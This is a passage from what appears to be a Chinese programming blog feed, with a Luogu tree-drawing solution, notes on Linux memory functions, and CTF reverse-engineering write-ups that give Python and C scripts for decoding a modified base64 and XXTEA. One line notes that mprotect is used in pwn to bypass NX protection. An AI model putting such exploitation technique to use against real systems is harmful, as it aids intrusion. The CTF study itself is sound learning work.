class="number">96</span>,<span class="number">192</span>,<span class="number">384</span>,<span class="number">768</span>,<span class="number">1536</span>&#125;;</span><br></pre></td></tr></table></figure><p>每次横坐标加就行了</p><p>这样,我们最后就有了一个完全二叉树,然后就是去节点了.<br>画布里存得是点或边在这张”画”里得坐标,而题目输入进来得是结点在树中得坐标,这时我们就开一个结构体数组存树,数组的每个元素为结点,每个元素(都是一个结构体变量)里的结构体成员x和y存的是通过计算求得的在画布里的坐标,然后找到要删除的点,把它和它的子树所在的一个正方形区都归为’ ‘(空格),如图:<img src="https://cdn.luogu.com.cn/upload/image_hosting/n0l0wfis.png"></p><p>然后,愉快的输出就行了,其他的细节在代码中:</p><p>AC代码:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> n,k,num,x,y,line=<span class="number">19000</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> l,r,f[<span class="number">20</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">23</span>,<span class="number">47</span>,<span class="number">95</span>,<span class="number">191</span>,<span class="number">383</span>,<span class="number">767</span>&#125;;<span class="comment">//解释过了</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> s[<span class="number">20</span>]=&#123;<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">48</span>,<span class="number">96</span>,<span class="number">192</span>,<span class="number">384</span>,<span class="number">768</span>,<span class="number">1536</span>&#125;;<span class="comment">//跳跃的长度</span></span><br><span class="line"><span class="type">char</span> paint[<span class="number">20001</span>][<span class="number">5000</span>];<span class="comment">//画布</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">TREE</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> x,y;</span><br><span class="line">&#125;tree[<span class="number">1040</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">draw</span><span class="params">(<span class="type">long</span> <span class="type">long</span> i)</span><span class="comment">//画边和点</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">x=line,y=l;</span><br><span class="line">l=y+f[i]+<span class="number">1</span>;<span class="comment">//l---左边界的重新计算要在这里</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> j=<span class="number">1</span>;j&lt;=num/<span class="number">2</span>;++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/////////向右上画//////////////</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> k=<span class="number">1</span>;k&lt;=f[i];++k)</span><br><span class="line">paint[--x][++y]=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">paint[--x][++y]=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line"><span class="comment">//////////////////////////////</span></span><br><span class="line"><span class="comment">/////////向左下画回去//////////</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> k=<span class="number">1</span>;k&lt;=f[i];++k)</span><br><span class="line">paint[++x][++y]=<span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line"><span class="comment">//////////////////////////////</span></span><br><span class="line">++x;</span><br><span class="line">y++;</span><br><span class="line">y+=s[i];</span><br><span class="line"><span class="comment">//重新计算坐标</span></span><br><span class="line">&#125;</span><br><span class="line">y-=s[i];</span><br><span class="line">r=y-f[i]<span class="number">-1</span>;</span><br><span class="line">line=x-f[i]<span class="number">-1</span>;</span><br><span class="line">num/=<span class="number">2</span>;</span><br><span class="line"><span class="comment">//把num---即当前行的结点数、</span></span><br><span class="line"><span class="comment">//r---右边界、</span></span><br><span class="line"><span class="comment">//line---最高点的所在行</span></span><br><span class="line"><span class="comment">//重新计算为向上一行(左边界在上边重新计算)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">remove_down_all</span><span class="params">(<span class="type">long</span> <span class="type">long</span> up,<span class="type">long</span> <span class="type">long</span> r_l,<span class="type">long</span> <span class="type">long</span> r_r)</span><span class="comment">//重置矩形区域</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=up;i&lt;=<span class="number">19000</span>;++i)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> j=r_l;j&lt;=r_r;++j)</span><br><span class="line">paint[i][j]=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">remove_up_edge</span><span class="params">(<span class="type">long</span> <span class="type">long</span> x,<span class="type">long</span> <span class="type">long</span> y)</span><span class="comment">//删除(重置为&#x27; &#x27;(即空格))要删除点向上与父亲的连线</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> ex=x<span class="number">-1</span>,ey=y<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>(paint[ex][ey]!=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">while</span>(paint[ex][ey]!=<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">paint[ex--][ey--]=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">ex=x<span class="number">-1</span>,ey=y+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(paint[ex][ey]!=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">while</span>(paint[ex][ey]!=<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">paint[ex--][ey++]=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(paint,<span class="string">&#x27; &#x27;</span>,<span class="built_in">sizeof</span>(paint));</span><br><span class="line">num=<span class="number">1</span>&lt;&lt;(n<span class="number">-1</span>);</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> num2=num;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> len=<span class="number">0</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> to=(num2/<span class="number">2</span>)*<span class="number">6</span><span class="number">-1</span>;<span class="comment">//to为整棵树的宽度,我们要用它输出树(列循环范围)</span></span><br><span class="line">l=<span class="number">1</span>;r=(num/<span class="number">2</span>)*<span class="number">6</span><span class="number">-1</span>;<span class="comment">//初始化左右边界</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=<span class="number">1</span>,j=<span class="number">1</span>;i&lt;=num/<span class="number">2</span>;++i,j+=<span class="number">6</span>)<span class="comment">//初始化最下面一行</span></span><br><span class="line">&#123;</span><br><span class="line">paint[<span class="number">19000</span>][j]=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">paint[<span class="number">19000</span>][j+<span class="number">4</span>]=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=<span class="number">1</span>;i&lt;n;++i)<span class="comment">//开始从下往上每一层&quot;绘画&quot;</span></span><br><span class="line"><span class="built_in">draw</span>(i);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=line;i&lt;=<span class="number">19000</span>;++i)<span class="comment">//计算坐标,用以删除结点</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> j=<span class="number">1</span>;j&lt;=to;++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(paint[i][j]==<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">tree[++len].x=i;</span><br><span class="line">tree[len].y=j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> t,y1,y2;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=<span class="number">1</span>;i&lt;=k;++i)<span class="comment">//删除结点(每次删除之前的准备工作)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">t=<span class="number">1</span>&lt;&lt;(x<span class="number">-1</span>);</span><br><span class="line">t=t+y<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>(t&gt;len)<span class="keyword">continue</span>;</span><br><span class="line">x=tree[t].x;</span><br><span class="line">y=tree[t].y;</span><br><span class="line">y1=y-(<span class="number">19000</span>-x);</span><br><span class="line">y2=y+(<span class="number">19000</span>-x);</span><br><span class="line"></span><br><span class="line"><span class="built_in">remove_down_all</span>(x,y1,y2);</span><br><span class="line"><span class="built_in">remove_up_edge</span>(x,y);<span class="comment">//这两个函数才是真正的删除</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//处理完了......</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=line;i&lt;=<span class="number">19000</span>;++i)<span class="comment">//输出,结束</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> j=<span class="number">1</span>;j&lt;=to;++j)</span><br><span class="line">cout&lt;&lt;paint[i][j];</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>管理员求过…真的是自己的做法</p>]]></content>
      
      
      <categories>
          
          <category> 洛谷 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c系函数总结</title>
      <link href="/2023-08-28-fbefc4f390e2/"/>
      <url>/2023-08-28-fbefc4f390e2/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-c函数"><a href="#Linux-c函数" class="headerlink" title="Linux c函数"></a>Linux c函数</h1><h2 id="内存控制"><a href="#内存控制" class="headerlink" title="内存控制"></a>内存控制</h2><h3 id="mprotect函数"><a href="#mprotect函数" class="headerlink" title="mprotect函数"></a>mprotect函数</h3><p>用于更改一段内存的保护属性,例如将可读写的内存区域变为只读，或者将只读的内存区域变为可执行等.</p><p>pwn中常用于修改.bss段的属性以此来绕过<strong>NX保护</strong>.</p><p>函数原型:</p><p><code>int mprotect(void *addr, size_t len, int prot);</code></p><p>参数说明：</p><ul><li><code>addr</code>：要更改保护属性的内存区域的起始地址。</li><li><code>len</code>：内存区域的长度（以字节为单位）。</li><li><code>prot</code>：新的保护权限，可以是 <code>PROT_NONE</code>、<code>PROT_READ</code>、<code>PROT_WRITE</code>、<code>PROT_EXEC</code> 等的组合。</li></ul><p><code>mprotect</code> 函数返回 0 表示成功，返回 -1 表示失败，并设置相应的错误码。</p><h3 id="mmap函数"><a href="#mmap函数" class="headerlink" title="mmap函数"></a>mmap函数</h3><p>用于内存映射,可以用于简化例如进程间通信—IPC需要4次数据复制,而内存映射到共享区只需2次复制即可</p><p>函数原型:</p><p><code>void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);</code></p><p>参数说明：</p><ul><li><code>addr</code>：映射的起始地址，通常为 <code>NULL</code>，由系统自动分配。</li><li><code>length</code>：映射区域的大小，以字节为单位。</li><li><code>prot</code>：映射区域的保护权限，可以是 <code>PROT_READ</code>、<code>PROT_WRITE</code>、<code>PROT_EXEC</code> 等的组合。</li><li><code>flags</code>：映射选项，如 <code>MAP_SHARED</code>、<code>MAP_PRIVATE</code> 等。</li><li><code>fd</code>：文件描述符，表示要映射的文件或设备。</li><li><code>offset</code>：映射的偏移量，表示从文件的哪个位置开始映射。</li></ul><p><code>mmap</code> 返回一个指向映射区域的指针，如果映射失败，则返回 <code>MAP_FAILED</code>。</p><h3 id="read函数"><a href="#read函数" class="headerlink" title="read函数"></a>read函数</h3><p>用于读取文件—linux一切皆文件,从打开的文件描述符中读取</p><p>函数原型:</p><p><code>ssize_t read(int fd, void *buf, size_t count);</code></p><p>参数为:</p><p>​文件描述符,读入到的缓冲区,读取的字节数</p><h3 id="write函数"><a href="#write函数" class="headerlink" title="write函数"></a>write函数</h3><p>用于读取文件—linux一切皆文件,从打开的文件描述符中写入</p><p>函数原型:</p><p><code>ssize_t write(int fd, const void *buf, size_t count);</code></p><p>参数为:</p><p>​文件描述符,制定从哪个缓冲区用于写入,写入的字节数</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> functions </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制作业第三周</title>
      <link href="/2023-08-06-68569be36fac/"/>
      <url>/2023-08-06-68569be36fac/</url>
      
        <content type="html"><![CDATA[<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="拔丝溜四（NewstarsCTF2022）"><a href="#拔丝溜四（NewstarsCTF2022）" class="headerlink" title="拔丝溜四（NewstarsCTF2022）"></a>拔丝溜四（NewstarsCTF2022）</h2><p><del>题在这里:</del><a href="https://buuoj.cn/match/matches/146/challenges#%E6%8B%94%E4%B8%9D%E6%BA%9C%E8%82%86%20(easy)">https://buuoj.cn/match/matches/146/challenges#%E6%8B%94%E4%B8%9D%E6%BA%9C%E8%82%86%20(easy)</a></p><p>这个题,对base64进行了魔改…</p><p>首先,分析题目,从start入口寻找main:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230806194752784.png" alt="image-20230806194752784"></p><p>从这里的Code&#x3D;某个函数()继续进入(既然是给返回代码赋值,那么很有可能就是main入口)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230806194844163.png" alt="image-20230806194844163"></p><p>这里的j_main是我命名成main的,后来IDA又重新分析为j_main(),进入真正的main后就可以正式分析了,</p><p>实际上代码就是对输入的长度为42的flag进行魔改的base64编码,编码结果就是main中那个显而易见的str2:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230806195020106.png" alt="image-20230806195020106"></p><p>第29行的encode()也是自己修改的函数名,魔改的base64()编码就是这里进行</p><p>进入后发现不是普通的base64,encode()将flag分成若干组,3个一组分别进行编码,但是每一组都使用不同的编码字符表—也就是所谓的变表加密</p><p>再次进入循环中的第一句函数调用中,发现有一个rand(),实际从逻辑上考虑肯定不可能是随机的,否则不会出现那个固定的base64结果,所以联想到对srand()调用时输入了某个固定的种子,但是我这里没有看出来哪个是srand()函数的调用(我太菜了)</p><p>于是我使用动态调试的方法,一个个的把求字符表的偏移值v1求出来:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230806195428984.png" alt="image-20230806195428984" style="zoom:50%;" /><p>在这里设断点后,直到运行完,把所有的v1出现过的值写成python列表就可以写解密脚本了:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;CPaKBfUZFcNwW9qCKgyvuS2PGPQ9mttGc/wCNS0w6hDwGOSsOkOEkL5V&#x27;</span></span><br><span class="line">alpha = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">key = [<span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x39</span>, <span class="number">0xa</span>, <span class="number">0x3e</span>, <span class="number">0x1e</span>, <span class="number">0x3b</span>, <span class="number">0x19</span>, <span class="number">0x0c</span>, <span class="number">0x0</span>, <span class="number">0x2e</span>, <span class="number">0x3a</span>, <span class="number">0x1</span>, <span class="number">0x18</span>]</span><br><span class="line"><span class="comment">#key即v1的所有变化值</span></span><br><span class="line">step = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">4</span>):</span><br><span class="line">    new_alpha = <span class="string">&#x27;&#x27;</span> + alpha[key[step]:] + alpha[<span class="number">0</span>:key[step]]<span class="comment">#将原字符表进行两部分的切片,调换位置,如不懂需要再去看看源码逻辑</span></span><br><span class="line">    <span class="comment"># print(new_alpha)</span></span><br><span class="line">    step += <span class="number">1</span></span><br><span class="line">    result = base64.b64decode(data[i:i + <span class="number">4</span>].translate(<span class="built_in">str</span>.maketrans(new_alpha, alpha)))</span><br><span class="line">    <span class="comment">#这里使用maketrans进行字符表的映射转换</span></span><br><span class="line">    <span class="built_in">print</span>(result.decode(),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230806195649900.png" alt="image-20230806195649900"></p><p>但是比赛结束了没办法提交flag…</p><p>结束…</p><h2 id="EzTea-NewstarsCTF2022"><a href="#EzTea-NewstarsCTF2022" class="headerlink" title="EzTea(NewstarsCTF2022)"></a>EzTea(NewstarsCTF2022)</h2><p>这个题顾名思义,Tea加密…</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230807114651660.png" alt="image-20230807114651660" style="zoom:50%;" /><p>去分析代码就能知道,要对输入的串(之所以不说字符串是因为加密解密还是说字节串比较好)进行加密,然后与一个9*sizeof(int32_t)&#x3D;&#x3D;36字节长度的加密后的串进行比较,也就是说这个加密的串就是加密后的flag.</p><p>那么我们要分析程序的加密算法,容易得知这是TEA系列的加密算法,而且通过加密中的&lt;&lt;4和&gt;&gt;4可以知道是TEA目前优化最好的(貌似?)XXTEA加密(不过MX还是要自己改的)</p><p>写出逆向解密脚本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 这是网上的XXTEA使用的MX,但是与题不符</span></span><br><span class="line"><span class="comment"> * #define MX (z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)^(sum^y) + (k[p&amp;3^e]^z);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * IDA反汇编的加密部分,根据此进行MX的修改</span></span><br><span class="line"><span class="comment"> * v9 = ((v5 ^ *(_DWORD * )(a3 + 4i64 * (v10 ^ i &amp; 3))) + (v6 ^ v7)) ^ (((32 * v5) ^ (v6 &gt;&gt; 3))</span></span><br><span class="line"><span class="comment"> * + ((4 * v6) ^ (v5 &gt;&gt; 4)))</span></span><br><span class="line"><span class="comment"> * + intlist[i];</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这是根据IDA正确编写的解密算法</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z ^ k[(e^p)&amp;3])+(y^sum))^ (((32*z)^y&gt;&gt;3)+((4*y)^(z&gt;&gt;4))))</span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> *k)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> z = v[n - <span class="number">1</span>], y = v[<span class="number">0</span>], sum = <span class="number">0</span>, e, DELTA = <span class="number">0x11451400</span>;</span><br><span class="line">    <span class="type">unsigned</span> p, q;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;          <span class="comment">/* Coding Part */</span></span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        <span class="keyword">while</span> (q-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++) y = v[p + <span class="number">1</span>], z = v[p] += MX;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123;  <span class="comment">/* Decoding Part */</span></span><br><span class="line">        n = -n;</span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = q * DELTA;</span><br><span class="line">        <span class="keyword">while</span> (sum != <span class="number">0</span>) &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--) z = v[p - <span class="number">1</span>], y = v[p] -= MX;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>] = &#123;<span class="number">0x19</span>, <span class="number">0x19</span>, <span class="number">0x8</span>, <span class="number">0x10</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> data[] = &#123;</span><br><span class="line">            <span class="number">0x82</span>, <span class="number">0x8a</span>, <span class="number">0xfa</span>, <span class="number">0x38</span>, <span class="number">0x80</span>,</span><br><span class="line">            <span class="number">0x13</span>, <span class="number">0x50</span>, <span class="number">0xd7</span>, <span class="number">0x9d</span>, <span class="number">0x96</span>,</span><br><span class="line">            <span class="number">0x40</span>, <span class="number">0xe</span>, <span class="number">0x20</span>, <span class="number">0x91</span>, <span class="number">0x16</span>,</span><br><span class="line">            <span class="number">0x4e</span>, <span class="number">0xab</span>, <span class="number">0x29</span>, <span class="number">0x3a</span>, <span class="number">0x71</span>,</span><br><span class="line">            <span class="number">0x3d</span>, <span class="number">0x39</span>, <span class="number">0xe5</span>, <span class="number">0x6c</span>, <span class="number">0x2e</span>,</span><br><span class="line">            <span class="number">0x75</span>, <span class="number">0x9d</span>, <span class="number">0xb6</span>, <span class="number">0xe6</span>, <span class="number">0x88</span>,</span><br><span class="line">            <span class="number">0x1a</span>, <span class="number">0x84</span>, <span class="number">0x59</span>, <span class="number">0xb4</span>, <span class="number">0x31</span>, <span class="number">0x6f</span></span><br><span class="line">    &#125;;</span><br><span class="line">    btea((<span class="type">uint32_t</span> *) data, <span class="number">-9</span>, k);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">36</span>; i += <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230807114835421.png" alt="image-20230807114835421" style="zoom:33%;" /><p>结束…</p><h2 id="BabyAlgorithm"><a href="#BabyAlgorithm" class="headerlink" title="BabyAlgorithm"></a>BabyAlgorithm</h2><p>这个题没啥好说的,就是RC4,然后我非要自己写脚本…费老半天</p><p>按照顺序把S-box(key)之类的求出来就行</p><p>我的代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 